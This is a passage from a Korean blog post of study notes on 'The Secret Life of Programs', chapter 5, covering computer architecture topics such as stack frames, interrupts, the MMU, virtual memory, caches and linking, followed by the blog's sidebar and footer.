<li>함수가 호출될 때마다 반환 주소 이외에도 각각의 독립된 로컬 변수를 사용하기 때문에, 로컬 변수 역시 스택에 저장하면 각각의 함수 호출을 독립적으로 구성할 수 있다. 이렇게 매 함수 호출 시 스택에 저장되는 데이터의 모음을 스택 프레임이라 한다.</li>
</ul>
<h2 id="인터럽트"><a href="#인터럽트" class="headerlink" title="인터럽트"></a>인터럽트</h2><ul>
<li>폴링(Polling)은 자원을 많이 소비할 수 있으므로, 인터럽트 시스템이 필요하다.</li>
<li>인터럽트 요청이 발생하면, 처리중인 명령어까지는 마무리한 후 프로그램을 중단하고 인터럽트 핸들러라는 프로그램(함수)을 실행하고, 다시 원래 프로그램이 중단된 위치부터 실행을 계속한다.</li>
<li>이를 위해 인터럽트에 대응하고 실행 중이던 프로그램으로 돌아가기까지 걸리는 시간을 제한해야 하며, 스택에 인터럽트 발생 이전의 상태를 저장하였다가 복구해줘야 한다.</li>
<li>인터럽트 벡터: 컴퓨터는 각 인터럽트에 대응하는 인터럽트 핸들러 주소를 지정하는 포인터를 가지고 있는데, 이를 인터럽트 벡터라 한다.</li>
</ul>
<h2 id="상대-주소-지정"><a href="#상대-주소-지정" class="headerlink" title="상대 주소 지정"></a>상대 주소 지정</h2><ul>
<li>여러 프로그램을 동시에 사용할 때, 타이머를 통해 각 프로그램이 실행되는 시간을 제한하여 스위칭하는 스케줄링 방식을 시분할이라 한다.</li>
<li>이를 위해 각 프로그램에 다른 공간을 허용하는데, 이 때 한 프로그램이 다른 프로그램이 사용하는 메모리에 접근하면 여러 가지 문제가 발생할 수 있다.</li>
<li>이를 방지하기 위해 메모리 주소를 절대적으로 지정하는 것은 바람직하지 않으며, 상대 주소 지정을 통해 프로그램이 접근할 수 있는 메모리 주소를 재배치한다.</li>
</ul>
<h2 id="메모리-관리-장치"><a href="#메모리-관리-장치" class="headerlink" title="메모리 관리 장치"></a>메모리 관리 장치</h2><ul>
<li>한 프로그램이 의도치 않게, 또는 의도적으로 허용되지 않은 메모리에 접근하는 것은 바람직하지 않으므로 이를 위해 메모리 관리 장치(Memory Management Unit)이 사용된다.</li>
<li>프로그램은 가상 주소를 사용하여 작성되고, MMU는 이를 물리적 주소로 변환하는 역할을 한다.</li>
<li>MMU는 페이징 기법을 활용하여 실제 가능한 물리주소 범위보다 넓은 범위의 가상 주소를 사용할 수 있게 해준다.</li>
</ul>
<h2 id="가상-메모리"><a href="#가상-메모리" class="headerlink" title="가상 메모리"></a>가상 메모리</h2><ul>
<li>MMU의 페이징 기법으로 확장된 메모리 가용 영역보다 더 큰 영역이 필요할 경우, OS는 현재 필요하지 않은 페이지를 느리지만 용량이 큰 디스크로 옮겨버리고(swap out), 추후 다시 접근이 필요할 때 다시 메모리에 불러들인다(swap in).</li>
<li>이는 성능을 크게 저하시키지만, 메모리가 부족해서 실행할 수 없는 프로그램을 실행할 수 있게 해준다.</li>
</ul>
<h2 id="메모리-계층과-성능"><a href="#메모리-계층과-성능" class="headerlink" title="메모리 계층과 성능"></a>메모리 계층과 성능</h2><ul>
<li>CPU에 비해 메모리가 느리기 때문에, 메모리 계층이라는 개념을 적용, CPU에 캐시라는 하드웨어를 추가하여 CPU가 필요로 할 가능성이 높은 데이터를 미리 읽어옴으로써 성능 향상을 기대할 수 있다.</li>
</ul>
<h2 id="메모리상의-데이터-배치"><a href="#메모리상의-데이터-배치" class="headerlink" title="메모리상의 데이터 배치"></a>메모리상의 데이터 배치</h2><ul>
<li>실행 전에는 크기를 알 수 없는 데이터, 즉 동적 데이터를 다루기 위해 힙(heap)이라는 영역을 사용한다.</li>
</ul>
<h2 id="프로그램-실행"><a href="#프로그램-실행" class="headerlink" title="프로그램 실행"></a>프로그램 실행</h2><ul>
<li>링커는 재사용 등을 위해 조각난 프로그램을 하나로 연결하여 실행 가능한 프로그램을 만들어주는 프로그램이다.</li>
<li>라이브러리를 프로그램에 직접 가져다 붙이는 방식을 정적 링크라 하고, 공유 라이브러리를 사용하여 여러 프로그램이 같은 라이브러리를 사용할 수 있도록 하는 방식을 동적 링크라 한다.</li>
<li>공유 라이브러리의 명령어는 해당 라이브러리를 사용하는 모든 프로그램에서 공통이므로, 라이브러리 함수를 작성할 때는 호출하는 프로그램의 스택과 힙을 사용하도록 함수를 설계한다.</li>
<li>프로그램이 합쳐져 실행파일이 되면, 런타임 라이브러리가 추가되어 프로그램 실행시 가장 먼저 실행되고 이후 진입점의 명령어가 수행되면서 프로그램이 실행된다.</li>
<li>런타임 라이브러리는 프로그램이 사용할 메모리 설정을 수행하면서 스택과 힙 영역을 설정하고 데이터의 초깃값도 설정하는 역할을 한다.</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2021/08/01/tslop-05/" data-id="cl6fthswx001geon9bpaqdr12" data-title="The Secret Life of Programs - 05. Computer Architecture" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/book/" rel="tag">book</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/the-secret-life-of-programs/" rel="tag">the-secret-life-of-programs</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; 이전</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">다음 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">태그</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWS/" rel="tag">AWS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GitHub-Pages/" rel="tag">GitHub Pages</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TECS/" rel="tag">TECS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Terraform/" rel="tag">Terraform</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Travis-CI/" rel="tag">Travis CI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book/" rel="tag">book</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/books/" rel="tag">books</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/devops/" rel="tag">devops</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/email/" rel="tag">email</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fundamental/" rel="tag">fundamental</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/history/" rel="tag">history</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/infrastructure/" rel="tag">infrastructure</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/" rel="tag">network</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/streaming/" rel="tag">streaming</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/the-secret-life-of-programs/" rel="tag">the-secret-life-of-programs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unix/" rel="tag">unix</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekend/" rel="tag">weekend</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">태그 클라우드</h3>
    <div class="widget tagcloud">
      <a href="/tags/AWS/" style="font-size: 10px;">AWS</a> <a href="/tags/GitHub-Pages/" style="font-size: 10px;">GitHub Pages</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/TECS/" style="font-size: 15px;">TECS</a> <a href="/tags/Terraform/" style="font-size: 10px;">Terraform</a> <a href="/tags/Travis-CI/" style="font-size: 12.5px;">Travis CI</a> <a href="/tags/book/" style="font-size: 20px;">book</a> <a href="/tags/books/" style="font-size: 10px;">books</a> <a href="/tags/devops/" style="font-size: 12.5px;">devops</a> <a href="/tags/email/" style="font-size: 10px;">email</a> <a href="/tags/fundamental/" style="font-size: 15px;">fundamental</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/history/" style="font-size: 10px;">history</a> <a href="/tags/infrastructure/" style="font-size: 10px;">infrastructure</a> <a href="/tags/linux/" style="font-size: 12.5px;">linux</a> <a href="/tags/network/" style="font-size: 17.5px;">network</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/streaming/" style="font-size: 10px;">streaming</a> <a href="/tags/the-secret-life-of-programs/" style="font-size: 12.5px;">the-secret-life-of-programs</a> <a href="/tags/unix/" style="font-size: 10px;">unix</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/weekend/" style="font-size: 15px;">weekend</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">아카이브</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">8월 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">7월 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">6월 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">4월 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">1월 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">12월 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">11월 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">10월 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">8월 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">7월 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">최근 포스트</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/08/04/aws-waf/">AWS WAF란?</a>
          </li>
        
          <li>
            <a href="/2022/07/22/tecs-05/">밑바닥부터 만드는 컴퓨팅 시스템 05</a>
          </li>
        
          <li>
            <a href="/2022/07/14/scp-and-rsync/">scp와 rsync</a>
          </li>
        
          <li>
            <a href="/2022/07/13/tecs-04/">밑바닥부터 만드는 컴퓨팅 시스템 04</a>
          </li>
        
          <li>
            <a href="/2022/07/11/tecs-010203/">밑바닥부터 만드는 컴퓨팅 시스템 01-03</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 JY<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>